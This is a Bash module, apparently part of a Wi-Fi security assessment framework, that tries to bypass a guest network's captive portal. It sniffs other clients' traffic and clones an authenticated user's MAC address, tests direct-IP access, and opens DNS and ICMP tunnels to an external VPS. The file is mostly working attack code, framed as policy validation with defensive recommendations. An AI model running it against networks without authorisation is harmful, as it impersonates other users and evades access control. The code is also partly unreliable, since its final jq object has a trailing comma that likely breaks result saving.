#!/usr/bin/env bash
#===============================================================================
#  modules/f4_portal_bypass.sh
#  F4: Captive Portal Bypass
#
#  PURPOSE:
#    Test multiple techniques to bypass the captive portal on the guest
#    WiFi network. Includes MAC cloning of authenticated clients,
#    DNS tunneling, ICMP tunneling, and direct IP access.
#
#  TOOLS: ${TOOL_PATHS[macchanger]}, ${TOOL_PATHS[tcpdump]}, ${TOOL_PATHS[tshark]}, iodine, ptunnel-ng, ${TOOL_PATHS[curl]}
#  PHASE: 2B — Policy Validation
#  DEPENDENCIES: F3 (captive portal analysis)
#
#  EVIDENCE PRODUCED:
#    - f4_bypass_results.txt       (bypass attempt results)
#    - f4_auth_clients.txt         (authenticated client MACs observed)
#    - f4_findings.txt             (analysis summary)
#
#  RESULT JSON FIELDS:
#    - mac_clone_bypass: bool
#    - dns_tunnel_bypass: bool
#    - icmp_tunnel_bypass: bool
#    - direct_ip_bypass: bool
#    - bypass_methods[]: list of successful methods
#===============================================================================

run_f4() {
    local total_steps=7
    local evidence_prefix="${SESSION_EVIDENCE_DIR}/f4"

    #--- Step 1: Verify tools and prerequisites ---
    log_step 1 $total_steps "Verifying tools and prerequisites"
    update_tc_progress 1 $total_steps "Checking"

    
    local has_macchanger=false
    local has_iodine=false
    local has_ptunnel=false
    local has_tshark=false

    command -v macchanger &>/dev/null && has_macchanger=true
    command -v iodine &>/dev/null && has_iodine=true
    command -v ptunnel-ng &>/dev/null && has_ptunnel=true
    command -v tshark &>/dev/null && has_tshark=true

    if [[ -n "${MONITOR_INTERFACE:-}" ]]; then
        disable_monitor_mode
        sleep 3
    fi
    ensure_managed_mode || return 1

    local iface="${WIFI_INTERFACE:-wlan0}"

    if [[ "${CAPTIVE_PORTAL:-}" != "yes" ]]; then
        log_warn "Captive portal was not detected or not confirmed."
        echo ""
        get_or_request_param "proceed" "  Proceed with bypass testing anyway? [y/N]"
        [[ "${proceed,,}" != "y" ]] && return 1
    fi

    #--- Info banner ---
    echo ""
    echo -e "${C_CYAN}${C_BOLD}"
    echo "  ╔════════════════════════════════════════════════════════════════════╗"
    echo "  ║  CAPTIVE PORTAL BYPASS TESTING                                   ║"
    echo "  ║                                                                    ║"
    echo "  ║  Tests:                                                           ║"
    echo "  ║    1. MAC Cloning — clone an authenticated client's MAC           ║"
    echo "  ║    2. DNS Tunnel — tunnel data via DNS queries (iodine)           ║"
    echo "  ║    3. ICMP Tunnel — tunnel data via ICMP echo (ptunnel-ng)        ║"
    echo "  ║    4. Direct IP — test if direct IP access bypasses DNS redirect  ║"
    echo "  ╚════════════════════════════════════════════════════════════════════╝"
    echo -e "${C_RESET}"
    echo ""
    get_or_request_param "confirm" "  Proceed with bypass tests? [Y/n]"
    [[ "${confirm,,}" == "n" ]] && return 1

    local mac_clone_bypass="false"
    local dns_tunnel_bypass="false"
    local icmp_tunnel_bypass="false"
    local direct_ip_bypass="false"
    local bypass_methods="[]"
    local findings_file="${evidence_prefix}_findings.txt"
    local bypass_file="${evidence_prefix}_bypass_results.txt"
    local auth_clients_file="${evidence_prefix}_auth_clients.txt"

    {
        echo "============================================================"
        echo "  F4: Captive Portal Bypass Test"
        echo "  Date: $(date '+%Y-%m-%d %H:%M:%S')"
        echo "  Interface: ${iface}"
        echo "============================================================"
        echo ""
    } > "$findings_file"

    {
        echo "============================================================"
        echo "  Bypass Attempt Results"
        echo "============================================================"
        echo ""
    } > "$bypass_file"

    #--- Step 2: Check current portal state ---
    log_step 2 $total_steps "Verifying captive portal state"
    update_tc_progress 2 $total_steps "Portal check"

    check_abort || return 1

    # Test if we're currently behind the captive portal
    local portal_active="false"
    local test_url="http://detectportal.firefox.com/canonical.html"
    local expected_response="success"

    local http_response
    local http_response=$(timeout 10 ${TOOL_PATHS[curl]} -s -L -o /dev/null -w "%{http_code}" "$test_url" 2>/dev/null) || true

    if [[ "$http_response" != "200" ]]; then
        local portal_active="true"
        log_info "Captive portal appears ACTIVE (HTTP redirected: ${http_response})"
    else
        # Check response body
        local body
        local body=$(timeout 10 ${TOOL_PATHS[curl]} -s -L "$test_url" 2>/dev/null) || true
        if [[ "$body" != *"$expected_response"* ]]; then
            local portal_active="true"
            log_info "Captive portal appears ACTIVE (response modified)"
        else
            log_info "Captive portal may not be active — already authenticated?"
        fi
    fi

    echo "Portal active: ${portal_active}" >> "$findings_file"

    #--- Step 3: MAC Cloning bypass ---
    log_step 3 $total_steps "Testing MAC cloning bypass"
    update_tc_progress 3 $total_steps "MAC cloning"

    check_abort || return 1

    if [[ "$has_macchanger" == "true" ]]; then
        # First, sniff for authenticated clients sending data traffic
        log_info "Sniffing for authenticated client MACs (30s)..."

        local sniff_pcap="/tmp/f4_sniff.pcap"
        ${TOOL_PATHS[tcpdump]} -i "$iface" -c 100 -w "$sniff_pcap" \
            "not arp and not udp port 67 and not udp port 68" &>/dev/null &
        local sniff_pid=$!
        register_cleanup "kill -SIGINT $sniff_pid 2>/dev/null || true; wait $sniff_pid 2>/dev/null || true"

        start_countdown 30 "Observing network traffic for authenticated clients"
        sleep 30
        stop_countdown

        kill -SIGINT $sniff_pid 2>/dev/null; wait $sniff_pid 2>/dev/null

        # Extract unique source MACs that are sending real traffic
        local my_mac
        local my_mac=$(${TOOL_PATHS[ip]} link show "$iface" 2>/dev/null | awk '/ether/{print $2}')
        local gw_mac
        local gw_mac=$(${TOOL_PATHS[ip]} neigh show dev "$iface" 2>/dev/null | head -1 | awk '{print $5}')

        {
            echo "============================================================"
            echo "  Authenticated Client MACs Observed"
            echo "============================================================"
            echo ""
        } > "$auth_clients_file"

        local target_mac=""
        if [[ -f "$sniff_pcap" && "$has_tshark" == "true" ]]; then
            local observed_macs
            local observed_macs=$(${TOOL_PATHS[tshark]} -r "$sniff_pcap" -T fields -e eth.src 2>/dev/null \
                | sort | uniq -c | sort -rn \
                | awk '{print $2}' \
                | grep -iv "${my_mac}" \
                | grep -iv "${gw_mac:-NOMATCH}" \
                | head -10 || true)

            if [[ -n "$observed_macs" ]]; then
                echo "$observed_macs" >> "$auth_clients_file"
                local target_mac=$(echo "$observed_macs" | head -1)
                log_info "Found authenticated client MAC: ${target_mac}"
            fi
        fi
        rm -f "$sniff_pcap"

        if [[ -n "$target_mac" ]]; then
            local original_mac="$my_mac"

            log_info "Cloning MAC: ${target_mac}"
            echo "Attempting MAC clone: ${original_mac} -> ${target_mac}" >> "$bypass_file"

            # Change MAC
            ${TOOL_PATHS[ip]} link set "$iface" down 2>/dev/null || true
            ${TOOL_PATHS[macchanger]} -m "$target_mac" "$iface" &>/dev/null || true
            ${TOOL_PATHS[ip]} link set "$iface" up 2>/dev/null || true
            
            register_cleanup "${TOOL_PATHS[ip]} link set $iface down 2>/dev/null || true; ${TOOL_PATHS[macchanger]} -m $original_mac $iface &>/dev/null || true; ${TOOL_PATHS[ip]} link set $iface up 2>/dev/null || true; dhclient $iface 2>/dev/null || true"

            # Wait for reconnection
            sleep 10

            # Re-acquire DHCP
            if command -v dhclient &>/dev/null; then
                dhclient -r "$iface" 2>/dev/null || true
                sleep 2
                dhclient "$iface" 2>/dev/null || true
            fi
            sleep 5

            # Test connectivity
            local clone_response
            local clone_response=$(timeout 10 ${TOOL_PATHS[curl]} -s -L "$test_url" 2>/dev/null) || true

            if [[ "$clone_response" == *"$expected_response"* ]]; then
                local mac_clone_bypass="true"
                bypass_methods=$(echo "$bypass_methods" | ${TOOL_PATHS[jq]} '. += ["MAC cloning"]')
                log_result "CRITICAL" "★ MAC cloning BYPASSED captive portal!"
                echo "CRITICAL: MAC cloning bypassed captive portal (cloned: ${target_mac})" >> "$findings_file"
            else
                log_info "MAC cloning did not bypass captive portal"
            fi
            echo "MAC clone result: $(if [[ "$mac_clone_bypass" == "true" ]]; then echo "BYPASS"; else echo "BLOCKED"; fi)" >> "$bypass_file"
        else
            log_info "No authenticated client MACs found to clone"
            echo "SKIPPED: No authenticated clients observed for MAC cloning" >> "$bypass_file"
        fi
    else
        log_info "${TOOL_PATHS[macchanger]} not available — skipping MAC clone test"
        echo "SKIPPED: ${TOOL_PATHS[macchanger]} not installed" >> "$bypass_file"
    fi

    #--- Step 4: Direct IP bypass ---
    log_step 4 $total_steps "Testing direct IP access bypass"
    update_tc_progress 4 $total_steps "Direct IP"

    check_abort || return 1

    # Try accessing a known IP directly (bypassing DNS)
    local direct_ips=("1.1.1.1" "8.8.8.8" "93.184.216.34")  # 93.184.216.34 = example.com

    for test_ip in "${direct_ips[@]}"; do
        local ip_response
        local ip_response=$(timeout 10 ${TOOL_PATHS[curl]} -s -o /dev/null -w "%{http_code}" "http://${test_ip}" 2>/dev/null) || true

        echo "Direct IP test (${test_ip}): HTTP ${ip_response}" >> "$bypass_file"

        if [[ "$ip_response" == "200" || "$ip_response" == "301" || "$ip_response" == "302" ]]; then
            # Verify it's not a portal redirect
            local ip_body
            local ip_body=$(timeout 10 ${TOOL_PATHS[curl]} -s "http://${test_ip}" 2>/dev/null) || true
            if [[ "$ip_body" != *"login"* && "$ip_body" != *"captive"* && "$ip_body" != *"portal"* ]]; then
                local direct_ip_bypass="true"
                bypass_methods=$(echo "$bypass_methods" | ${TOOL_PATHS[jq]} '. += ["Direct IP access"]')
                log_result "FINDING" "Direct IP access bypasses captive portal (${test_ip})"
                echo "FINDING: Direct IP access bypass via ${test_ip}" >> "$findings_file"
                break
            fi
        fi
    done

    if [[ "$direct_ip_bypass" == "false" ]]; then
        log_info "Direct IP access does not bypass captive portal"
    fi

    #--- Step 5: DNS tunnel bypass ---
    log_step 5 $total_steps "Testing DNS tunnel bypass"
    update_tc_progress 5 $total_steps "DNS tunnel"

    check_abort || return 1

    if [[ "$has_iodine" == "true" && -n "${VPS_DOMAIN:-}" && -n "${VPS_IP:-}" ]]; then
        log_info "Testing DNS tunnel via iodine to ${VPS_DOMAIN}..."
        echo "DNS tunnel test (iodine): VPS=${VPS_IP}, Domain=${VPS_DOMAIN}" >> "$bypass_file"

        log_cmd "iodine -f -P tunnel_test ${VPS_IP} ${VPS_DOMAIN}"

        # Try iodine connection (short timeout)
        timeout 30 iodine -f -P "tunnel_test" "$VPS_IP" "$VPS_DOMAIN" &>/dev/null &
        local iodine_pid=$!
        register_cleanup "kill -TERM $iodine_pid 2>/dev/null || true; sleep 0.5; kill -9 $iodine_pid 2>/dev/null || true; wait $iodine_pid 2>/dev/null || true"

        sleep 15

        # Check if dns0 interface was created
        if ${TOOL_PATHS[ip]} link show dns0 &>/dev/null; then
            local dns_tunnel_bypass="true"
            bypass_methods=$(echo "$bypass_methods" | ${TOOL_PATHS[jq]} '. += ["DNS tunnel (iodine)"]')
            log_result "CRITICAL" "★ DNS tunnel established — captive portal bypassed!"
            echo "CRITICAL: DNS tunnel (iodine) bypassed captive portal" >> "$findings_file"
        else
            log_info "DNS tunnel could not be established"
        fi

        # Cleanup
        kill -TERM $iodine_pid 2>/dev/null; wait $iodine_pid 2>/dev/null
        ${TOOL_PATHS[ip]} link delete dns0 2>/dev/null || true
    elif [[ "$has_iodine" == "true" ]]; then
        log_info "iodine available but VPS not configured — skipping DNS tunnel"
        echo "SKIPPED: DNS tunnel (VPS not configured)" >> "$bypass_file"
    else
        log_info "iodine not installed — skipping DNS tunnel test"
        echo "SKIPPED: DNS tunnel (iodine not installed)" >> "$bypass_file"
    fi

    #--- Step 6: ICMP tunnel bypass ---
    log_step 6 $total_steps "Testing ICMP tunnel bypass"
    update_tc_progress 6 $total_steps "ICMP tunnel"

    check_abort || return 1

    if [[ "$has_ptunnel" == "true" && -n "${VPS_IP:-}" ]]; then
        log_info "Testing ICMP tunnel via ptunnel-ng to ${VPS_IP}..."
        echo "ICMP tunnel test (ptunnel-ng): VPS=${VPS_IP}" >> "$bypass_file"

        # First check if ICMP is allowed at all
        if ping -c 2 -W 3 "$VPS_IP" &>/dev/null; then
            log_info "ICMP to VPS is reachable — testing tunnel..."

            log_cmd "ptunnel-ng -p ${VPS_IP}"

            timeout 30 ptunnel-ng -p "$VPS_IP" &>/dev/null &
            local ptunnel_pid=$!
            register_cleanup "kill -TERM $ptunnel_pid 2>/dev/null || true; sleep 0.5; kill -9 $ptunnel_pid 2>/dev/null || true; wait $ptunnel_pid 2>/dev/null || true"

            sleep 10

            # Test if tunnel works (try to ${TOOL_PATHS[curl]} through localhost proxy)
            local tunnel_test
            local tunnel_test=$(timeout 10 ${TOOL_PATHS[curl]} -s -o /dev/null -w "%{http_code}" --proxy "socks5://127.0.0.1:2222" "http://example.com" 2>/dev/null) || true

            if [[ "$tunnel_test" == "200" ]]; then
                local icmp_tunnel_bypass="true"
                bypass_methods=$(echo "$bypass_methods" | ${TOOL_PATHS[jq]} '. += ["ICMP tunnel (ptunnel-ng)"]')
                log_result "CRITICAL" "★ ICMP tunnel established — captive portal bypassed!"
                echo "CRITICAL: ICMP tunnel (ptunnel-ng) bypassed captive portal" >> "$findings_file"
            else
                log_info "ICMP tunnel could not proxy traffic"
            fi

            kill -TERM $ptunnel_pid 2>/dev/null; wait $ptunnel_pid 2>/dev/null
        else
            log_info "ICMP to VPS blocked — ICMP tunnel not possible"
            echo "INFO: ICMP to VPS blocked pre-auth" >> "$bypass_file"
        fi
    elif [[ "$has_ptunnel" == "true" ]]; then
        log_info "ptunnel-ng available but VPS not configured — skipping"
        echo "SKIPPED: ICMP tunnel (VPS not configured)" >> "$bypass_file"
    else
        log_info "ptunnel-ng not installed — skipping ICMP tunnel test"
        echo "SKIPPED: ICMP tunnel (ptunnel-ng not installed)" >> "$bypass_file"
    fi

    #--- Step 7: Save results ---
    log_step 7 $total_steps "Saving results"
    update_tc_progress 7 $total_steps "Saving"

    local bypass_count
    bypass_count=$(echo "$bypass_methods" | ${TOOL_PATHS[jq]} 'length')

    local result_status="SECURE"
    local result_summary=""
    local recommendations=""

    if [[ $bypass_count -gt 0 ]]; then
        local result_status="FINDING"
        local methods_str
        local methods_str=$(echo "$bypass_methods" | ${TOOL_PATHS[jq]} -r 'join(", ")')
        local result_summary="Captive portal bypass successful using ${bypass_count} method(s): ${methods_str}."
        local recommendations=""

        if [[ "$mac_clone_bypass" == "true" ]]; then
            recommendations+="1) Implement session binding to IP+MAC+browser fingerprint. "
            recommendations+="2) Use 802.1X port-based authentication instead of MAC-based portal. "
        fi
        if [[ "$dns_tunnel_bypass" == "true" ]]; then
            recommendations+="${recommendations:+3) }Block DNS to external servers pre-auth; only allow portal DNS. "
        fi
        if [[ "$icmp_tunnel_bypass" == "true" ]]; then
            recommendations+="${recommendations:+4) }Block ICMP echo to external destinations pre-auth. "
        fi
        if [[ "$direct_ip_bypass" == "true" ]]; then
            recommendations+="${recommendations:+5) }Implement layer-3 ACLs to block all non-portal traffic pre-auth. "
        fi
    else
        local result_summary="Captive portal bypass was not successful with any tested method. Portal enforcement appears effective."
        local recommendations="Continue monitoring. Consider periodic re-testing with updated techniques."
    fi

    local result_json
    evidence_register_file "f4_bypass_results.txt"
    evidence_register_file "f4_auth_clients.txt"
    evidence_register_file "f4_findings.txt"

    local result_json=$(${TOOL_PATHS[jq]} -n \
        --arg status "$result_status" \
        --arg summary "$result_summary" \
        --arg details "MAC clone: ${mac_clone_bypass}, DNS tunnel: ${dns_tunnel_bypass}, ICMP tunnel: ${icmp_tunnel_bypass}, Direct IP: ${direct_ip_bypass}" \
        --arg recommendations "$recommendations" \
        --arg mac_clone_bypass "$mac_clone_bypass" \
        --arg dns_tunnel_bypass "$dns_tunnel_bypass" \
        --arg icmp_tunnel_bypass "$icmp_tunnel_bypass" \
        --arg direct_ip_bypass "$direct_ip_bypass" \
        --argjson bypass_methods "$bypass_methods" \
        '{
            status: $status,
            summary: $summary,
            details: $details,
            recommendations: $recommendations,
            mac_clone_bypass: ($mac_clone_bypass == "true"),
            dns_tunnel_bypass: ($dns_tunnel_bypass == "true"),
            icmp_tunnel_bypass: ($icmp_tunnel_bypass == "true"),
            direct_ip_bypass: ($direct_ip_bypass == "true"),
            bypass_methods: $bypass_methods,
                    }')

    save_tc_result "F4" "$result_json"

    # Display summary
    echo ""
    if [[ $bypass_count -gt 0 ]]; then
        log_result "FINDING" "Captive portal bypassed via: $(echo "$bypass_methods" | ${TOOL_PATHS[jq]} -r 'join(", ")')"
    else
        log_result "SECURE" "Captive portal bypass unsuccessful — enforcement appears effective"
    fi

    return 0
}
